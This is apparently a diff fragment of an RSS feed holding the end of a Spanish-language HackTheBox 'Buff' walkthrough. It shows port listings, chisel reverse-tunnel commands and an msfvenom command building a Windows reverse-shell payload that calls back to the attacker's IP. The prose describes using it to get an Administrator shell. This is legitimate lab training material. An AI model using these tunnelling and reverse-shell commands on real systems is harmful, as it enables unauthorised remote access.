+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;2156&lt;/span&gt;
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;672&lt;/span&gt;
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;688&lt;/span&gt;
+  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
+  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;7844&lt;/span&gt;
+  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;8416&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:135               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;956&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:445               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:7680              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;4256&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:8080              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;3648&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:49664             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;528&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:49665             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;1108&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:49666             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;1504&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:49667             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;2156&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:49668             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;672&lt;/span&gt;
+  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:49669             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;688&lt;/span&gt;
+
+C:&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;ampp&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;tdocs&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;ym&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;pload&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utlizamos &lt;a href=&#34;https://github.com/jpillora/chisel/releases/tag/v1.7.0-rc9&#34;&gt;&lt;strong&gt;chisel&lt;/strong&gt;&lt;/a&gt; para realizar reverse tunneling al puerto 8888, descargamos este en la maquina y ejecutamos un tunel reverso de SSH a nuestra maquina, para obtener el puerto 8888 localmente y explotarlo con el exploit que encontramos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;chisel.exe client 10.10.14.44:8080 R:8888:127.0.0.1:8888
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;En nuestra maquina ejecutamos chisel server:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;chisel server -p &lt;span class=&#34;m&#34;&gt;8080&lt;/span&gt; --reverse
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ahora que tenemos el puerto 8888 localmente podemos explotar este con el exploit pero primero debemos de crear nuestro payload con &lt;code&gt;msfvenom&lt;/code&gt; para que ejecute una shell inversa.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msfvenom -p windows/shell_reverse_tcp &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10.10.14.44 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; -f c
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Una vez generado nuestro payload reemplazamos el que esta en el exploit con el nuestro, ponemos a la escucha netcat localmente, ejecutamos el exploit y logramos obtener una shell con usuario Administrator y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/buff/Screenshot_20200912_031317.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/buff/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/buff/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>chisel</category>
+            
+          
+            
+              <category>dirbuster</category>
+            
+          
+            
+              <category>metasploit</category>
+            
+          
+            
+              <category>msfvenom</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>windows</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>TryHackMe - Aster</title>
